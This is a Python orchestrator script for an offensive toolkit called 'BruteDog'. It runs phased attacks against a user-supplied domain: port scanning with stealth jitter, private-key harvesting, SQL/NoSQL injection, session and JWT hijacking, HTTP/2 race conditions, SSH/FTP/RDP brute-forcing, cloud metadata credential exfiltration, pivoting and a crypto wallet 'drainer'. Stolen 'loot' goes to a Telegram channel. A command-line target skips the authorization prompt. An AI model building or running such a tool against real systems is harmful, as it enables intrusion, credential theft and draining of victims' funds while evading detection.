#!/usr/bin/env python3
"""
BRUTEDOG V8.8 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE
"""
import asyncio
import ipaddress
import socket
import sys
import time
from urllib.parse import urlsplit

# Import framework modules
from modules.db_assault import run_nosql_assault
from modules.session_hijack import run_session_hijack
from modules.race_condition import run_race_condition_test
from modules.drainer import run_drainer_engine
from modules.parser import parse_target_source
from modules.scanner import run_port_scanner
from modules.engine import run_autonomous_engine
from modules.replayer import replay_and_inject_payloads
from modules.bruter import execute_active_assault_engine
from modules.cloud_apex import run_cloud_apex
from modules.pivot import run_pivot_engine
from modules.dumper import execute_memory_dumper
from modules.keyharvester import harvest_private_keys
from modules.stealth_ops import run_stealth_engine
from modules.live_login_verifier import execute_live_login_verification
from modules.behavioral_mimic import apply_behavioral_jitter

# Import Cognitive Operator for real-time feedback orchestration
from modules.cognitive_operator import CognitiveOperator

# Import Telegram Notifier Dispatcher
from modules.telegram_notifier import send_telegram_alert

# ============================================================
# TERMINAL COLORS & LOOT HIGHLIGHTS
# ============================================================
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
MATRIX_GREEN = "\033[38;5;46m"
NEON_BLUE = "\033[38;5;51m"
LOOT_PURPLE = "\033[38;5;201m"
LOOT_YELLOW = "\033[38;5;220m"
DIM = "\033[2m"
RESET = "\033[0m"

BANNER = f"""{MATRIX_GREEN}{BOLD}
  ╔╗ ╦═╗╦ ╦╺┳╸╔═╗╦═╗╔═╗╔═╗
  ╠╩╗╠╦╝║ ║ ┃ ╠═ ║ ║║ ║║ ╦
  ╚═╝╩╚═╚═╝ ╹ ╚═╝╩═╝╚═╝╚═╝
{RESET}
{RED}{BOLD}  ▓▓▓ SYSTEM COMPROMISED ▓▓▓{RESET}
{NEON_BLUE}{DIM}  ──────────────────────────{RESET}
{CYAN}   NODE STATUS   : {GREEN}ONLINE{RESET}
{CYAN}   ACCESS LEVEL  : {RED}ROOT{RESET}
{CYAN}   ENCRYPTION    : {LOOT_PURPLE}AES-256{RESET}
{NEON_BLUE}{DIM}  ──────────────────────────{RESET}
"""

_background_tasks: set[asyncio.Task] = set()


# ============================================================
# TERMINAL OUTPUT HELPERS & LIVE EFFECTS
# ============================================================
def log(message, color=GREEN):
    print(f"{color}{message}{RESET}", flush=True)


def section(title):
    print()
    log("─" * 30, NEON_BLUE)
    log(f" {title}", BOLD)
    log("─" * 30, NEON_BLUE)


def display_progress(message):
    print(f"{CYAN}[*] {message}{RESET}", flush=True)


def type_line(text, color=GREEN, delay=0.01):
    """Types text out character by character for a live terminal feel."""
    sys.stdout.write(color)
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        if delay > 0:
            time.sleep(delay)
    sys.stdout.write(RESET + "\n")


def glitch_flash(text, color=RED, flashes=2, delay=0.04):
    """Flickers text on/off for a brief intro effect."""
    for _ in range(flashes):
        sys.stdout.write(f"\r{color}{BOLD}{text}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
        sys.stdout.write(f"\r{' ' * len(text)}")
        sys.stdout.flush()
        time.sleep(delay / 2)
    sys.stdout.write(f"\r{color}{BOLD}{text}{RESET}\n")


async def _dispatch_telegram(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=10)
    except Exception:
        pass


def alert_loot(loot_type, details, wait_for_send=False):
    """
    Real-time loot notification banner for verified discoveries
    + Dispatches asynchronous Telegram alerts safely.
    """
    print(f"\n{LOOT_YELLOW}{BOLD}[!!!] CRITICAL LOOT DISCOVERED: {loot_type.upper()} [!!!]{RESET}")
    print(f"{LOOT_PURPLE}-----------------------------------------------------------------")
    if isinstance(details, dict):
        for k, v in details.items():
            print(f"  {BOLD}{k}: {RESET}{v}")
    else:
        print(f"  {details}")
    print(f"{LOOT_PURPLE}-----------------------------------------------------------------{RESET}\n", flush=True)

    try:
        loop = asyncio.get_running_loop()
        task = loop.create_task(_dispatch_telegram(loot_type, details))
        _background_tasks.add(task)
        task.add_done_callback(_background_tasks.discard)
        return task if wait_for_send else None
    except RuntimeError:
        try:
            asyncio.run(_dispatch_telegram(loot_type, details))
        except Exception:
            pass
    return None


# ============================================================
# VERIFICATION HELPERS (PREVENTS FALSE LOOT BANNERS)
# ============================================================
def has_verified_brute_loot(brute_loot):
    if not brute_loot:
        return []
    items = brute_loot if isinstance(brute_loot, list) else [brute_loot]
    verified = []
    for entry in items:
        if not isinstance(entry, dict):
            continue
        if (
            entry.get("authenticated") is True
            or entry.get("success") is True
            or entry.get("cracked_credential") not in (None, "", False)
            or entry.get("credential") not in (None, "", False)
        ):
            verified.append(entry)
    return verified


def has_verified_cloud_loot(cloud_loot):
    if not isinstance(cloud_loot, dict):
        return False
    meta = cloud_loot.get("metadata_exposure") or {}
    exfil = meta.get("exfiltrated_data") if isinstance(meta, dict) else None
    return bool(cloud_loot.get("credentials_collected") is True or exfil)


def has_verified_race_loot(race_loot):
    if not isinstance(race_loot, dict):
        return []
    if race_loot.get("suppressed") is True or race_loot.get("waf_blocked") is True:
        return []
    findings = race_loot.get("findings") or []
    verified = []
    for item in findings:
        if not isinstance(item, dict):
            continue
        if item.get("suppressed") is True or item.get("waf_challenge") is True:
            continue
        if item.get("verified") is True or (
            item.get("severity") == "CRITICAL" and item.get("successful_streams", 0) > 1
        ):
            verified.append(item)
    return verified


# ============================================================
# TARGET & DNS VALIDATION
# ============================================================
def normalize_target(raw_target):
    raw_target = raw_target.strip()
    if not raw_target:
        raise ValueError("Empty target.")
    if "://" not in raw_target:
        raw_target = "https://" + raw_target
    parsed = urlsplit(raw_target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS targets are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid hostname.")
    if parsed.username or parsed.password:
        raise ValueError("Embedded target credentials are not accepted.")
    hostname = parsed.hostname.encode("idna").decode("ascii").lower()
    if not hostname:
        raise ValueError("Invalid target hostname.")
    try:
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
    except ValueError:
        raise ValueError("Invalid target port.")
    if not 1 <= port <= 65535:
        raise ValueError("Invalid target port.")
    return {
        "hostname": hostname,
        "scheme": parsed.scheme,
        "port": port,
        "url": f"{parsed.scheme}://{hostname}:{port}",
    }


def validate_target_host(host):
    display_progress(f"Resolving target: {host}")
    try:
        results = socket.getaddrinfo(
            host,
            None,
            family=socket.AF_UNSPEC,
            type=socket.SOCK_STREAM,
        )
        addresses = sorted({result[4][0] for result in results})
        if not addresses:
            return False, []
        for address in addresses:
            ip = ipaddress.ip_address(address)
            if ip.is_unspecified or ip.is_multicast or ip.is_loopback or ip.is_link_local:
                log(f"[DNS WARNING] Unusable address detected: {ip}", RED)
                return False, []
        log(f"[DNS] Resolved addresses: {', '.join(addresses)}")
        return True, addresses
    except socket.gaierror as exc:
        log(f"[DNS ERROR] {exc}", RED)
        return False, []


# ============================================================
# DISPLAY HELPERS FOR MODULE RESULTS
# ============================================================
def display_scanner_results(result):
    if not isinstance(result, dict):
        log("[WARNING] Scanner returned unexpected result.", YELLOW)
        return
    open_ports = result.get("open_ports", [])
    log(f"Open ports detected: {len(open_ports)}")
    for item in open_ports:
        log(f"[OPEN] TCP/{item.get('port')}", GREEN)


def display_parser_results(result):
    if not isinstance(result, dict):
        return
    section("SOURCE INTELLIGENCE & EXPOSURE RESULTS")
    findings = result.get("findings", [])
    log(f"Findings detected: {len(findings)}")
    for finding in findings:
        if any(keyword in str(finding).lower() for keyword in ["token", "key", "secret", "auth", "credential"]):
            alert_loot("Source Exposure / Secret Token", finding)


# ============================================================
# MAIN EXECUTION ORCHESTRATION
# ============================================================
async def async_main():
    started = time.monotonic()
    print("\033[2J\033[H")

    glitch_flash("  INITIALIZING...", delay=0.04)
    print(BANNER)
    type_line("  > booting modules", CYAN)
    type_line("  > cognitive handshake complete", GREEN)
    log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.8 Elite Supremacy).")

    if len(sys.argv) > 1:
        raw_target = sys.argv[1]
        log(f"[TARGET] Loaded target from command line argument: {raw_target}", CYAN)
    else:
        raw_target = input(
            f"{MATRIX_GREEN}{BOLD}"
            "[TARGET] Enter your domain: "
            f"{RESET}"
        ).strip()

    try:
        target = normalize_target(raw_target)
    except ValueError as exc:
        log(f"[ABORT] {exc}", RED)
        return

    hostname = target["hostname"]
    section("PRE-FLIGHT VALIDATION")

    apply_behavioral_jitter()
    valid, addresses = validate_target_host(hostname)
    if not valid:
        log("[ABORT] DNS validation failed.", RED)
        return

    log(f"Target: {target['url']}")
    log(f"Hostname: {hostname}")
    log(f"Port: {target['port']}")
    log(f"Protocol: {target['scheme'].upper()}")

    cognitive_brain = CognitiveOperator(target_url=target["url"])
    use_ssl = target["scheme"] == "https"

    if len(sys.argv) <= 1:
        confirmation = input(
            f"\n{YELLOW}"
            "Confirm authorization and operational intent. Type YES: "
            f"{RESET}"
        ).strip()
        if confirmation != "YES":
            log("[ABORT] Confirmation not received.", RED)
            return
    else:
        log("[+] Automated execution confirmed via CLI parameter.", GREEN)

    # --------------------------------------------------------
    # PHASE 1 — NETWORK RECONNAISSANCE & STEALTH PROBING
    # --------------------------------------------------------
    section("PHASE 1 — NETWORK RECON & STEALTH OPS")
    scanner_result = None
    try:
        display_progress("Executing stealth operations and security control assessment.")
        apply_behavioral_jitter()
        await run_stealth_engine(target["url"])

        display_progress("Starting WAF-hardened TCP port assessment.")
        scanner_result = await run_port_scanner(hostname)
        display_scanner_results(scanner_result)
    except Exception as exc:
        log(f"[RECON ERROR] {exc}", RED)

    # --------------------------------------------------------
    # PHASE 2 — SOURCE INTELLIGENCE & KEY HARVESTING
    # --------------------------------------------------------
    section("PHASE 2 — SOURCE INTELLIGENCE & CRYPTO HARVESTING")
    try:
        display_progress("Parsing target source and extracting exposure indicators.")
        apply_behavioral_jitter()
        parser_result = await asyncio.to_thread(parse_target_source, target["url"])
        display_parser_results(parser_result)

        response_blob = str(parser_result)
        keys_found = harvest_private_keys(response_blob)
        if keys_found:
            alert_loot("Private Keys Harvested", keys_found)
    except Exception as exc:
        log(f"[PARSER ERROR] {exc}", RED)

    # --------------------------------------------------------
    # PHASE 3 — STATE-MACHINE CRAWLING & LOGIC EXPLOITATION
    # --------------------------------------------------------
    section("PHASE 3 — STATE-MACHINE CRAWL, BOLA & REPLAYER")
    try:
        display_progress("Executing state-machine crawler, BOLA state-skipping checks, and cognitive telemetry engine.")
        apply_behavioral_jitter()
        engine_results, _ = await run_autonomous_engine(target_host=target["url"])

        if isinstance(engine_results, list):
            for res in engine_results:
                for finding in res.get("findings", []):
                    if (
                        not finding.get("suppressed")
                        and not finding.get("waf_challenge")
                        and ("BYPASS" in finding.get("type", "") or "TOKEN" in finding.get("type", ""))
                    ):
                        alert_loot("Authentication Bypass / Token Acquired", finding)

        display_progress("Replaying secondary attack queue & executing session token fabrication.")
        await replay_and_inject_payloads(target["url"])
    except Exception as exc:
        log(f"[ENGINE ERROR] {exc}", RED)

    # --------------------------------------------------------
    # PHASE 3.5 — AGGRESSIVE DB ASSAULT, SESSION HIJACKING & HTTP/2 RACE CONDITIONS
    # --------------------------------------------------------
    section("PHASE 3.5 — AGGRESSIVE DB ASSAULT, SESSION HIJACKING & HTTP/2 CONCURRENCY")
    try:
        display_progress("Executing time-based blind SQLi and polymorphic NoSQL operator injection.")
        apply_behavioral_jitter()
        nosql_loot = await run_nosql_assault(target["url"], port=target["port"], use_ssl=use_ssl)
        if nosql_loot:
            alert_loot("Database Assault Breach / Credential Dump", nosql_loot)

        display_progress("Executing JWT secret cracking, algorithm downgrade, and cookie privilege escalation fuzzing.")
        session_loot = await run_session_hijack(target["url"], port=target["port"], use_ssl=use_ssl)
        if session_loot:
            alert_loot("Hijacked Session / Valid Cookie Jar", session_loot)

            display_progress("Verifying hijacked session live against target protected routes...")
            cookie_jar_to_test = session_loot.get("cookies") if isinstance(session_loot, dict) else {}
            token_to_test = session_loot.get("token") if isinstance(session_loot, dict) else None

            for route in ["/admin", "/dashboard", "/api/user/profile", "/transfer"]:
                verified = execute_live_login_verification(
                    target_url=target["url"],
                    endpoint=route,
                    cookie_dict=cookie_jar_to_test,
                    token=token_to_test,
                )
                if verified:
                    log(f"[+] Loot successfully verified and streamed on-screen from {route}!", GREEN)
                    break

        display_progress("Firing HTTP/2 single-packet multiplexed streams against transaction race condition windows.")
        apply_behavioral_jitter()
        race_loot = await run_race_condition_test(
            target_url=target["url"],
            port=target["port"],
            use_ssl=use_ssl,
            session_pool=None,
        )
        verified_races = has_verified_race_loot(race_loot)
        if verified_races:
            alert_loot("Race Condition Transfer / Execution Success", verified_races)
    except Exception as exc:
        log(f"[EXPLOIT/CONCURRENCY ERROR] {exc}", RED)

    # --------------------------------------------------------
    # PHASE 4 — MULTI-PROTOCOL BRUTE-FORCE ASSAULT
    # --------------------------------------------------------
    section("PHASE 4 — MULTI-PROTOCOL BRUTE-FORCE ASSAULT")
    try:
        display_progress("Launching multi-protocol brute-force (SSH, FTP, RDP, XML-RPC).")
        apply_behavioral_jitter()
        brute_loot = await execute_active_assault_engine(target["url"])
        verified_creds = has_verified_brute_loot(brute_loot)
        if verified_creds:
            alert_loot("Valid Service Credentials", verified_creds)
    except Exception as exc:
        log(f"[BRUTE ERROR] {exc}", RED)

    # --------------------------------------------------------
    # PHASE 5 — CLOUD INFRASTRUCTURE PIVOT & LIQUIDITY AUDIT
    # --------------------------------------------------------
    section("PHASE 5 — CLOUD INFRASTRUCTURE & LIQUIDITY AUDIT")
    try:
        display_progress("Executing cloud control plane pivot and IMDS metadata exfiltration.")
        apply_behavioral_jitter()
        cloud_loot = await run_cloud_apex(target["url"])
        if has_verified_cloud_loot(cloud_loot):
            alert_loot("Cloud Metadata / IAM Credentials", cloud_loot)

        display_progress("Running autonomous pivot engine and covert exfiltration preparation.")
        await run_pivot_engine(target["url"])

        display_progress("Executing active multi-chain liquidity audit & sweep routing.")
        apply_behavioral_jitter()
        drainer_loot = await run_drainer_engine(target["url"])
        if drainer_loot:
            alert_loot("Liquidity Audit / Wallet Swept Assets", drainer_loot)
    except Exception as exc:
        log(f"[DRAINER/CLOUD ERROR] {exc}", RED)

    # --------------------------------------------------------
    # FINAL SUMMARY
    # --------------------------------------------------------
    elapsed = time.monotonic() - started
    section("FINAL EXECUTION SUMMARY")
    print(f"Target: {target['url']}")
    print(f"Execution time: {elapsed:.2f} seconds")
    log("LIVE RED-TEAM ATTACK FINISHED", MATRIX_GREEN)
    log("All intelligence, hijacked sessions, and keys streamed live on-screen.", NEON_BLUE)
    log("Zero report files written to disk. Zero external emails sent.", NEON_BLUE)

    await _dispatch_telegram(
        "BruteDog Assessment Complete",
        {"target": target["url"], "duration": f"{elapsed:.2f}s"},
    )
    if _background_tasks:
        await asyncio.gather(*list(_background_tasks), return_exceptions=True)


# ============================================================
# ENTRY POINT
# ============================================================
def main():
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        log("\n[INTERRUPTED] Assessment stopped by operator.", YELLOW)
    except Exception as exc:
        log(f"\n[FATAL ERROR] {exc}", RED)


if __name__ == "__main__":
    main()
